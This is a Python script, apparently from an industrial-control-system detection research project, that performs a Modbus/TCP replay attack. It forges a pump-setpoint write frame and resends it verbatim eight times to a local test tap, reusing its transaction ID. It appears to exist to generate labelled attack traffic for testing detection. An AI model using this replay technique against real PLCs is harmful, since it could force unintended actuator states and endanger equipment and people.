"""
Replay attack against the Modbus/TCP PLC.

Threat model: an attacker who can reach the PLC (or sit on the ICS LAN)
captures a legitimate write command and retransmits it later, out of context,
to force actuator/setpoint state the operator did not intend. Modbus/TCP has
no authentication, no nonce, and no integrity check, so a byte-for-byte
retransmission is accepted as genuine - which is the whole point this project
is measuring detection against.

What this script does:
  1. Sends one *legitimate-looking* write (a normal setpoint value) to learn
     the exact bytes of a valid frame - standing in for having sniffed one.
  2. Retransmits that captured frame verbatim, several times, with its
     ORIGINAL transaction ID reused each time. Reused/stale transaction IDs
     and duplicated payloads with no matching fresh operator action are the
     signature a replay leaves on the wire.

It uses an ordinary ephemeral source port and reports the actual port on
stdout (`SOURCE_PORT=<n>`) so the orchestrator can record it as ground truth.
(Pinning a fixed source port is fragile: a back-to-back run collides with the
previous connection still in TIME_WAIT on Windows and the bind fails.)

Usage (normally invoked by attacks/run_scenario.py):
    python attacks/replay_attack.py
"""

import socket
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from modbus_frames import write_single_register, parse_transaction_id  # noqa: E402

TAP_HOST = "127.0.0.1"
TAP_PORT = 5021

HR_PUMP_SETPOINT = 1
REPLAY_COUNT = 8               # how many times to re-send the captured frame
REPLAY_SPACING = 0.4          # seconds between replays


def connect() -> socket.socket:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((TAP_HOST, TAP_PORT))
    return sock


def main() -> None:
    sock = connect()
    source_port = sock.getsockname()[1]
    # Reported on stdout so the orchestrator can label this session's frames.
    print(f"SOURCE_PORT={source_port}", flush=True)
    print(f"[replay] connected via tap {TAP_HOST}:{TAP_PORT} "
          f"(source port {source_port})")

    # Step 1: craft/capture a legitimate write frame (setpoint 55%). In a real
    # attack this frame would come from a sniffed operator command; here we
    # mint one valid frame and treat its bytes as the captured payload.
    captured = write_single_register(transaction_id=0x2A11,
                                     address=HR_PUMP_SETPOINT, value=55)
    sock.sendall(captured)
    _ = sock.recv(256)  # let the PLC answer so the capture stays well-formed
    print(f"[replay] captured a legitimate write frame, txid="
          f"0x{parse_transaction_id(captured):04X}")

    # Step 2: retransmit it verbatim, out of context, reusing the same txid.
    for i in range(REPLAY_COUNT):
        sock.sendall(captured)
        try:
            sock.recv(256)
        except OSError:
            pass
        print(f"[replay] resent captured frame {i + 1}/{REPLAY_COUNT} "
              f"(reused txid 0x{parse_transaction_id(captured):04X})")
        time.sleep(REPLAY_SPACING)

    sock.close()
    print("[replay] done.")


if __name__ == "__main__":
    main()
